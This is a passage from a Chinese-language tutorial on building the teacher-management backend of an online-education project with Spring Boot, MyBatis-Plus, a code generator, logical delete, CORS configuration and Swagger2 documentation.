<pre><code class="language-sql">INSERT INTO `edu_teacher` VALUES ('1','张三','近年主持国家自然科学基金（6项）、江苏省重大科技成果转化项目（5项）、江苏省产学研前瞻性联合研究项目（3项）、省工业科技支撑、省高技术、省自然科学基金等省部级及其企业的主要科研项目40多个，多个项目在企业成功转化，产生了较好的经济、社会和环境效益。积极开展产学研科技合作，并与省内16家企业建立了江苏省研究生工作站，其中6家为江苏省优秀研究生工作站','高级',1,'https://guli-file-190513.oss-cn-beijing.aliyuncs.com/avatar/default.jpg',0,0,'2019-10-30 14:18:46','2019-11-12 13:36:36'),('1189389726308478977','晴天','高级讲师简介','高级讲师资历',2,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/10/30/de47ee9b-7fec-43c5-8173-13c5f7f689b2.png',1,0,'2019-10-30 11:53:03','2019-10-30 11:53:03'),('1189390295668469762','李刚','高级讲师简介','高级讲师',2,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/10/30/b8aa36a2-db50-4eca-a6e3-cc6e608355e0.png',2,0,'2019-10-30 11:55:19','2019-11-12 13:37:52'),('1189426437876985857','王二','高级讲师简介','高级讲师',1,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/11/08/e44a2e92-2421-4ea3-bb49-46f2ec96ef88.png',0,0,'2019-10-30 14:18:56','2019-11-12 13:37:35'),('1189426464967995393','王五','高级讲师简介','高级讲师',1,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/10/30/65423f14-49a9-4092-baf5-6d0ef9686a85.png',0,0,'2019-10-30 14:19:02','2019-11-12 13:37:18'),('1192249914833055746','李四','高级讲师简介','高级讲师',1,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/11/07/91871e25-fd83-4af6-845f-ea8d471d825d.png',0,0,'2019-11-07 09:18:25','2019-11-12 13:37:01'),('1192327476087115778','1222-12-12','1111','11',1,'https://online-teach-file.oss-cn-beijing.aliyuncs.com/teacher/2019/11/08/5805c6cd-c8ad-4a77-aafd-d2e083bfd8a4.png',0,1,'2019-11-07 14:26:37','2019-11-11 16:26:26'),('1195337453429129218','test','sdfsdf','sdfdf',1,'https://guli-file-190513.oss-cn-beijing.aliyuncs.com/avatar/default.jpg',0,1,'2019-11-15 21:47:12','2019-11-15 21:47:27');
</code></pre>
<h2 id="二-数据库设计规约">二、数据库设计规约</h2>
<p>以下规约只针对本模块，更全面的文档参考《阿里巴巴Java开发手册》：五、MySQL数据库<br>
1、库名与应用名称尽量一致</p>
<p>2、表名、字段名必须使用小写字母或数字，禁止出现数字开头，</p>
<p>3、表名不使用复数名词</p>
<p>4、表的命名最好是加上“业务名称_表的作用”。如，edu_teacher_</p>
<p>5、表必备三字段：id, gmt_create, gmt_modified</p>
<p>说明：<br>
其中 id 必为主键，类型为 bigint unsigned、单表时自增、步长为 1。<br>
（如果使用分库分表集群部署，则id类型为verchar，非自增，业务中使用分布式id生成器）<br>
gmt_create, gmt_modified 的类型均为 datetime 类型，前者现在时表示主动创建，后者过去分词表示被动更新。</p>
<p>6、单表行数超过 500 万行或者单表容量超过 2GB，才推荐进行分库分表。 说明：如果预计三年后的数<br>
据量根本达不到这个级别，请不要在创建表时就分库分表。<br>
guli_edu.sql 1</p>
<p>7、表达是与否概念的字段，必须使用 is_xxx 的方式命名，数据类型是 unsigned tinyint （1 表示是，0 表示否）。<br>
说明：任何字段如果为非负数，必须是 unsigned。<br>
注意：POJO 类中的任何布尔类型的变量，都不要加 is 前缀。数据库表示是与否的值，使用 tinyint 类型，坚持 is_xxx 的 命名方式是为了明确其取值含义与取值范围。<br>
正例：表达逻辑删除的字段名 is_deleted，1 表示删除，0 表示未删除。</p>
<p>8、小数类型为 decimal，禁止使用 float 和 double。 说明：float 和 double 在存储的时候，存在精度损失的问题，很可能在值的比较时，得到不 正确的结果。如果存储的数据范围超过 decimal 的范围，建议将数据拆成整数和小数分开存储。</p>
<p>9、如果存储的字符串长度几乎相等，使用 char 定长字符串类型。</p>
<p>10、varchar 是可变长字符串，不预先分配存储空间，长度不要超过 5000，如果存储长度大于此值，定<br>
义字段类型为 text，独立出来一张表，用主键来对应，避免影响其它字段索 引效率。</p>
<p>11、唯一索引名为 uk_字段名；普通索引名则为 idx_字段名。<br>
说明：uk_ 即 unique key；idx_ 即 index 的简称</p>
<p>12、不得使用外键与级联，一切外键概念必须在应用层解决。外键与级联更新适用于单机低并发，不适<br>
合分布式、高并发集群；级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速<br>
度。</p>
<h1 id="三-搭建项目工程父工程">三、搭建项目工程（父工程）</h1>
<h3 id="一-项目构架">一、项目构架</h3>
<p>此项目为一体工程，不是分布式项目<br>
<img src="https://crlrlc.github.io//post-images/1687261740506.png" alt="" loading="lazy"></p>
<h4 id="1-工程结构介绍">1、工程结构介绍</h4>
<figure data-type="image" tabindex="6"><img src="https://crlrlc.github.io//post-images/1687261763596.png" alt="" loading="lazy"></figure>
<h4 id="2-模块说明">2、模块说明</h4>
<figure data-type="image" tabindex="7"><img src="https://crlrlc.github.io//post-images/1687261787255.png" alt="" loading="lazy"></figure>
<h3 id="二-创建父工程">二、创建父工程</h3>
<h4 id="1-创建sprigboot工程guli-parent">1、创建sprigboot工程guli-parent</h4>
<p>在idea开发工具中，使用 Spring Initializr 快速初始化一个 Spring Boot 模块，</p>
<p>版本使用：2.2.1.RELEASE<br>
<img src="https://crlrlc.github.io//post-images/1687261890804.png" alt="" loading="lazy"></p>
<h5 id="配置">配置：</h5>
<p>groupId：com.achang</p>
<p>artifactId：guli_parent</p>
<p>一直下一步到完成<br>
<img src="https://crlrlc.github.io//post-images/1687261965882.png" alt="" loading="lazy"></p>
<h4 id="2-删除-src-目录">2、删除 src 目录</h4>
<figure data-type="image" tabindex="8"><img src="https://crlrlc.github.io//post-images/1687262083748.png" alt="" loading="lazy"></figure>
<h4 id="3-配置-pomxml">3、配置 pom.xml</h4>
<p>修改版本为 ：2.2.1.RELEASE<br>
<img src="https://crlrlc.github.io//post-images/1687262161117.png" alt="" loading="lazy"></p>
<p><artifactId> 节点后面添加 pom类型</p>
<pre><code class="language-xml">&lt;artifactId&gt;guli-parent&lt;/artifactId&gt;
&lt;packaging&gt;pom&lt;/packaging&gt;
</code></pre>
<h4 id="4-在pomxml中添加依赖的版本">4、在pom.xml中添加依赖的版本</h4>
<p>删除pom.xml中的 <dependencies>内容</p>
<pre><code class="language-xml">&lt;!--以下为删除的内容--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
    &lt;scope&gt;test&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre>
<p>添加 <properties>确定依赖的版本</p>
<p>对这个项目进行 版本控制</p>
<pre><code class="language-xml">&lt;properties&gt;
    &lt;java.version&gt;1.8&lt;/java.version&gt;
    &lt;guli.version&gt;0.0.1-SNAPSHOT&lt;/guli.version&gt;
    &lt;mybatis-plus.version&gt;3.0.5&lt;/mybatis-plus.version&gt;
    &lt;velocity.version&gt;2.0&lt;/velocity.version&gt;
    &lt;swagger.version&gt;2.7.0&lt;/swagger.version&gt;
    &lt;aliyun.oss.version&gt;2.8.3&lt;/aliyun.oss.version&gt;
    &lt;jodatime.version&gt;2.10.1&lt;/jodatime.version&gt;
    &lt;poi.version&gt;3.17&lt;/poi.version&gt;
    &lt;commons-fileupload.version&gt;1.3.1&lt;/commons-fileupload.version&gt;
    &lt;commons-io.version&gt;2.6&lt;/commons-io.version&gt;
    &lt;httpclient.version&gt;4.5.1&lt;/httpclient.version&gt;
    &lt;jwt.version&gt;0.7.0&lt;/jwt.version&gt;
    &lt;aliyun-java-sdk-core.version&gt;4.3.3&lt;/aliyun-java-sdk-core.version&gt;
    &lt;aliyun-sdk-oss.version&gt;3.1.0&lt;/aliyun-sdk-oss.version&gt;
    &lt;aliyun-java-sdk-vod.version&gt;2.15.2&lt;/aliyun-java-sdk-vod.version&gt;
    &lt;aliyun-java-vod-upload.version&gt;1.4.11&lt;/aliyun-java-vod-upload.version&gt;
    &lt;aliyun-sdk-vod-upload.version&gt;1.4.11&lt;/aliyun-sdk-vod-upload.version&gt;
    &lt;fastjson.version&gt;1.2.28&lt;/fastjson.version&gt;
    &lt;gson.version&gt;2.8.2&lt;/gson.version&gt;
    &lt;json.version&gt;20170516&lt;/json.version&gt;
    &lt;commons-dbutils.version&gt;1.7&lt;/commons-dbutils.version&gt;
    &lt;canal.client.version&gt;1.1.0&lt;/canal.client.version&gt;
    &lt;docker.image.prefix&gt;zx&lt;/docker.image.prefix&gt;
    &lt;cloud-alibaba.version&gt;0.2.2.RELEASE&lt;/cloud-alibaba.version&gt;
&lt;/properties&gt;
</code></pre>
<p>配置 <dependencyManagement> 锁定依赖的版本</p>
<p>这里不会直接导入，只 会后面项目引入后才导入</p>
<pre><code class="language-xml">    &lt;!--依赖管理--&gt;
    &lt;dependencyManagement&gt;
        &lt;dependencies&gt;
            &lt;!--Spring Cloud--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
                &lt;version&gt;Hoxton.RELEASE&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;import&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
                &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;
                &lt;version&gt;${cloud-alibaba.version}&lt;/version&gt;
                &lt;type&gt;pom&lt;/type&gt;
                &lt;scope&gt;import&lt;/scope&gt;
            &lt;/dependency&gt;
            &lt;!--mybatis-plus 持久层--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.baomidou&lt;/groupId&gt;
                &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;
                &lt;version&gt;${mybatis-plus.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!-- velocity 模板引擎, Mybatis Plus 代码生成器需要 --&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;
                &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt;
                &lt;version&gt;${velocity.version}&lt;/version&gt;
            &lt;/dependency&gt;

            &lt;!--swagger--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;io.springfox&lt;/groupId&gt;
                &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
                &lt;version&gt;${swagger.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--swagger ui--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;io.springfox&lt;/groupId&gt;
                &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;
                &lt;version&gt;${swagger.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--aliyunOSS--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun.oss&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-sdk-oss&lt;/artifactId&gt;
                &lt;version&gt;${aliyun.oss.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--日期时间工具--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;joda-time&lt;/groupId&gt;
                &lt;artifactId&gt;joda-time&lt;/artifactId&gt;
                &lt;version&gt;${jodatime.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--xls--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
                &lt;artifactId&gt;poi&lt;/artifactId&gt;
                &lt;version&gt;${poi.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--xlsx--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
                &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt;
                &lt;version&gt;${poi.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--文件上传--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;
                &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;
                &lt;version&gt;${commons-fileupload.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--commons-io--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;commons-io&lt;/groupId&gt;
                &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
                &lt;version&gt;${commons-io.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--httpclient--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;
                &lt;artifactId&gt;httpclient&lt;/artifactId&gt;
                &lt;version&gt;${httpclient.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;
                &lt;artifactId&gt;gson&lt;/artifactId&gt;
                &lt;version&gt;${gson.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!-- JWT --&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt;
                &lt;artifactId&gt;jjwt&lt;/artifactId&gt;
                &lt;version&gt;${jwt.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;!--aliyun--&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt;
                &lt;version&gt;${aliyun-java-sdk-core.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun.oss&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-sdk-oss&lt;/artifactId&gt;
                &lt;version&gt;${aliyun-sdk-oss.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-java-sdk-vod&lt;/artifactId&gt;
                &lt;version&gt;${aliyun-java-sdk-vod.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-java-vod-upload&lt;/artifactId&gt;
                &lt;version&gt;${aliyun-java-vod-upload.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.aliyun&lt;/groupId&gt;
                &lt;artifactId&gt;aliyun-sdk-vod-upload&lt;/artifactId&gt;
                &lt;version&gt;${aliyun-sdk-vod-upload.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
                &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
                &lt;version&gt;${fastjson.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;org.json&lt;/groupId&gt;
                &lt;artifactId&gt;json&lt;/artifactId&gt;
                &lt;version&gt;${json.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;commons-dbutils&lt;/groupId&gt;
                &lt;artifactId&gt;commons-dbutils&lt;/artifactId&gt;
                &lt;version&gt;${commons-dbutils.version}&lt;/version&gt;
            &lt;/dependency&gt;
            &lt;dependency&gt;
                &lt;groupId&gt;com.alibaba.otter&lt;/groupId&gt;
                &lt;artifactId&gt;canal.client&lt;/artifactId&gt;
                &lt;version&gt;${canal.client.version}&lt;/version&gt;
            &lt;/dependency&gt;
        &lt;/dependencies&gt;
    &lt;/dependencyManagement&gt;
</code></pre>
<h3 id="四-搭建service模块">四、搭建service模块</h3>
<h4 id="一-搭建service模块">一、搭建service模块</h4>
<h5 id="1-在父工程guli-parent下面创建模块service">1、在父工程guli-parent下面创建模块service</h5>
<figure data-type="image" tabindex="9"><img src="https://crlrlc.github.io//post-images/1687262516428.png" alt="" loading="lazy"></figure>
<p>选择 maven类型，点击下一步</p>
<p>输入模块名称 service，下一步完成创建<br>
<img src="https://crlrlc.github.io//post-images/1687262588940.png" alt="" loading="lazy"></p>
<h5 id="2-添加模块类型是pom">2、添加模块类型是pom</h5>
<p><artifactId> 节点后面添加 pom类型</p>
<pre><code class="language-xml">&lt;artifactId&gt;service&lt;/artifactId&gt;
&lt;packaging&gt;pom&lt;/packaging&gt;
</code></pre>
<h5 id="3-添加项目需要的依赖">3、添加项目需要的依赖</h5>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--hystrix依赖，主要是用 @HystrixCommand --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--服务注册--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--服务调用--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--mybatis-plus--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.baomidou&lt;/groupId&gt;
    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--mysql--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;mysql&lt;/groupId&gt;
    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!-- velocity 模板引擎, Mybatis Plus 代码生成器需要 --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;
    &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--swagger--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;io.springfox&lt;/groupId&gt;
    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;io.springfox&lt;/groupId&gt;
    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--lombok用来简化实体类：需要安装lombok插件--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
    &lt;artifactId&gt;lombok&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--xls--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
    &lt;artifactId&gt;poi&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;
    &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;
    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--httpclient--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;
    &lt;artifactId&gt;httpclient&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--commons-io--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;commons-io&lt;/groupId&gt;
    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!--gson--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;
    &lt;artifactId&gt;gson&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;4.12&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>删除service模块的src目录</p>
<h4 id="二-搭建service-edu模块">二、搭建service-edu模块</h4>
<h5 id="1-在父工程service模块下面创建子模块service-edu">1、在父工程service模块下面创建子模块service-edu</h5>
<figure data-type="image" tabindex="10"><img src="https://crlrlc.github.io//post-images/1687262760684.png" alt="" loading="lazy"></figure>
<h3 id="五-讲师管理模块配置">五、讲师管理模块配置</h3>
<h4 id="1-在service下面service-edu模块中创建配置文件">1、在service下面service-edu模块中创建配置文件</h4>
<figure data-type="image" tabindex="11"><img src="https://crlrlc.github.io//post-images/1687262833003.png" alt="" loading="lazy"></figure>
<p>resources目录下创建文件 application.properties</p>
<pre><code class="language-properties"># 服务端口
server.port=8001
# 服务名
spring.application.name=service-edu
# 环境设置：dev、test、prod
spring.profiles.active=dev
# mysql数据库连接
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/guli?serverTimezone=GMT%2B8
spring.datasource.username=root
spring.datasource.password=00000
# mybatis日志
mybatis-plus.configuration.log-impl=org.apache.ibatis.logging.stdout.StdOutImpl
</code></pre>
<h4 id="2-创建mp代码生成器">2、创建MP代码生成器</h4>
<p>在test/java目录下创建包com.achang.eduservice，创建代码生成器：CodeGenerator.java</p>
<pre><code class="language-java">package com.achang.eduservice;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.annotation.IdType;
import com.baomidou.mybatisplus.generator.AutoGenerator;
import com.baomidou.mybatisplus.generator.config.DataSourceConfig;
import com.baomidou.mybatisplus.generator.config.GlobalConfig;
import com.baomidou.mybatisplus.generator.config.PackageConfig;
import com.baomidou.mybatisplus.generator.config.StrategyConfig;
import com.baomidou.mybatisplus.generator.config.rules.DateType;
import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;
import org.junit.Test;

/**
 * @阿昌
 */
public class CodeGenerator {

    @Test
    public void run() {

        // 1、创建代码生成器
        AutoGenerator mpg = new AutoGenerator();

        // 2、全局配置
        GlobalConfig gc = new GlobalConfig();
        String projectPath = System.getProperty(&quot;user.dir&quot;);
        gc.setOutputDir(&quot;D:\\JavaStudy\\gulixueyuan\\guli_parent\\service\\service_edu&quot; + &quot;/src/main/java&quot;); //输出目录

        gc.setAuthor(&quot;achang&quot;); //作者名
        gc.setOpen(false); //生成后是否打开资源管理器
        gc.setFileOverride(false); //重新生成时文件是否覆盖

        gc.setServiceName(&quot;%sService&quot;);	//去掉Service接口的首字母I
        gc.setIdType(IdType.ID_WORKER_STR); //主键策略
        gc.setDateType(DateType.ONLY_DATE);//定义生成的实体类中日期类型
        gc.setSwagger2(true);//开启Swagger2模式

        mpg.setGlobalConfig(gc);

        // 3、数据源配置
        DataSourceConfig dsc = new DataSourceConfig();
        dsc.setUrl(&quot;jdbc:mysql://localhost:3306/guli?serverTimezone=GMT%2B8&quot;);
        dsc.setDriverName(&quot;com.mysql.cj.jdbc.Driver&quot;);
        dsc.setUsername(&quot;root&quot;);
        dsc.setPassword(&quot;00000&quot;);
        dsc.setDbType(DbType.MYSQL);
        mpg.setDataSource(dsc);

        // 4、包配置
        PackageConfig pc = new PackageConfig();

        //生成包：com.achang.eduservice
        pc.setModuleName(&quot;eduservice&quot;); //模块名
        pc.setParent(&quot;com.achang&quot;);

        //生成包：com.achang.controller
        pc.setController(&quot;controller&quot;);
        pc.setEntity(&quot;entity&quot;);
        pc.setService(&quot;service&quot;);
        pc.setMapper(&quot;mapper&quot;);
        mpg.setPackageInfo(pc);

        // 5、策略配置
        StrategyConfig strategy = new StrategyConfig();
        strategy.setInclude(&quot;edu_teacher&quot;);//根据数据库哪张表生成，有多张表就加逗号继续填写

        strategy.setNaming(NamingStrategy.underline_to_camel);//数据库表映射到实体的命名策略
        strategy.setTablePrefix(pc.getModuleName() + &quot;_&quot;); //生成实体时去掉表前缀

        strategy.setColumnNaming(NamingStrategy.underline_to_camel);//数据库表字段映射到实体的命名策略
        strategy.setEntityLombokModel(true); // lombok 模型 @Accessors(chain = true) setter链式操作

        strategy.setRestControllerStyle(true); //restful api风格控制器
        strategy.setControllerMappingHyphenStyle(true); //url中驼峰转连字符

        mpg.setStrategy(strategy);


        // 6、执行
        mpg.execute();
    }
}
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://crlrlc.github.io//post-images/1687263020705.png" alt="" loading="lazy"></figure>
<h3 id="六-编写后台管理api接口">六、编写后台管理api接口</h3>
<h4 id="1-编写controller代码">1、编写controller代码</h4>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/eduservice/edu-teacher&quot;)
public class EduTeacherController {

    @Autowired
    private EduTeacherService eduTeacherService;

    //查询讲师表所有数据
    @GetMapping(&quot;/findAll&quot;)
    public List&lt;EduTeacher&gt; list(){
        return eduTeacherService.list(null);
    }

}
</code></pre>
<h4 id="2-创建springboot配置类">2、创建SpringBoot配置类</h4>
<p>在edu包下创建config包，创建MyBatisPlusConfig.java</p>
<pre><code class="language-java">@Configuration
@EnableTransactionManagement
@MapperScan(&quot;com.achang.eduservice.mapper&quot;)
public class MyBatisPlusConfig {
}
</code></pre>
<h4 id="3-配置sql执行性能分析插件">3、配置SQL执行性能分析插件</h4>
<p>在MyBatisPlusConfig下配置</p>
<pre><code class="language-java">/**
* SQL 执行性能分析插件
* 开发环境使用，线上不推荐。 maxTime 指的是 sql 最大执行时长
*/
@Bean
@Profile({&quot;dev&quot;,&quot;test&quot;})// 设置 dev test 环境开启
public PerformanceInterceptor performanceInterceptor() {
PerformanceInterceptor performanceInterceptor = new PerformanceInterceptor();
performanceInterceptor.setMaxTime(1000);//ms，超过此处设置的ms则sql不执行
performanceInterceptor.setFormat(true);
return performanceInterceptor;
}
</code></pre>
<h4 id="4-创建springboot启动类">4、创建SpringBoot启动类</h4>
<p>创建启动类 Service_edu_Main8001.java，注意启动类的创建位置</p>
<pre><code class="language-java">@SpringBootApplication
public class Service_edu_Main8001 {
    public static void main(String[] args) {
        SpringApplication.run(Service_edu_Main8001.class,args);
    }
}
</code></pre>
<h4 id="5-运行启动类">5、运行启动类</h4>
<p>访问http://localhost:8001/eduservice/edu-teacher/findAll<br>
得到json数据</p>
<figure data-type="image" tabindex="13"><img src="https://crlrlc.github.io//post-images/1687264915682.png" alt="" loading="lazy"></figure>
<h4 id="6-统一返回的json时间格式">6、统一返回的json时间格式</h4>
<p>默认情况下json时间格式带有时区，并且是世界标准时间，和我们的时间差了八个小时</p>
<p>在application.properties中设置</p>
<pre><code class="language-properties">#返回json的全局时间格式
spring.jackson.date-format=yyyy-MM-dd HH:mm:ss
spring.jackson.time-zone=GMT+8
</code></pre>
<h3 id="七-讲师逻辑删除功能">七、讲师逻辑删除功能</h3>
<h4 id="1-eduteachercontroller添加删除方法">1、EduTeacherController添加删除方法</h4>
<pre><code class="language-java">//逻辑删除讲师
@DeleteMapping(&quot;/deleteTeacherById/{id}&quot;)
public boolean deleteTeacherById(@PathVariable String id){
    return eduTeacherService.removeById(id);
}
</code></pre>
<h4 id="2-配置逻辑删除插件">2、配置逻辑删除插件</h4>
<p>MyBatisPlusConfig中配置</p>
<pre><code class="language-java">@Bean
public ISqlInjector sqlInjector() {
return new LogicSqlInjector();
}
</code></pre>
<h4 id="3-在实体类上对应标注注解">3、在实体类上对应标注注解</h4>
<pre><code class="language-java">@TableLogic
private Boolean isDeleted;
</code></pre>
<p>4、使用postman测试删除<br>
发送delte请求</p>
<p>http://localhost:8001/eduservice/edu-teacher/deleteTeacherById/1192249914833055746</p>
<figure data-type="image" tabindex="14"><img src="https://crlrlc.github.io//post-images/1687265115742.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://crlrlc.github.io//post-images/1687265158371.png" alt="" loading="lazy"></figure>
<p>测试结果<br>
数据库中的is_deleted字段被修改为1</p>
<h3 id="八-跨域配置">八、跨域配置</h3>
<h4 id="1-什么是跨域">1、什么是跨域</h4>
<p>浏览器从一个域名的网页去请求另一个域名的资源时，域名、端口、协议任一不同，都是跨域 。前后端分离开发中，需要考虑ajax跨域的问题。<br>
这里我们可以从服务端解决这个问题</p>
<h4 id="2-配置">2、配置</h4>
<p>在Controller类上添加注解@CrossOrigin</p>
<pre><code class="language-java">@RestController
@CrossOrigin //解决跨域问题
@RequestMapping(&quot;/eduservice/edu-teacher&quot;)
public class EduTeacherController {}
</code></pre>
<h3 id="九-配置swagger2生成api接口文档">九、配置Swagger2生成API接口文档</h3>
<h4 id="1-swagger2介绍">1、Swagger2介绍</h4>
<p>前后端分离开发模式中，api文档是最好的沟通方式。<br>
Swagger 是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。</p>
<p>生成在线接口文档</p>
<p>方便接口测试</p>
<pre><code>及时性 (接口变更后，能够及时准确地通知相关前后端开发人员)
规范性 (并且保证接口的规范性，如接口的地址，请求方式，参数及响应格式和错误信息)
一致性 (接口信息一致，不会出现因开发人员拿到的文档版本不一致，而出现分歧)
可测性 (直接在接口文档上进行测试，以方便理解业务)
</code></pre>
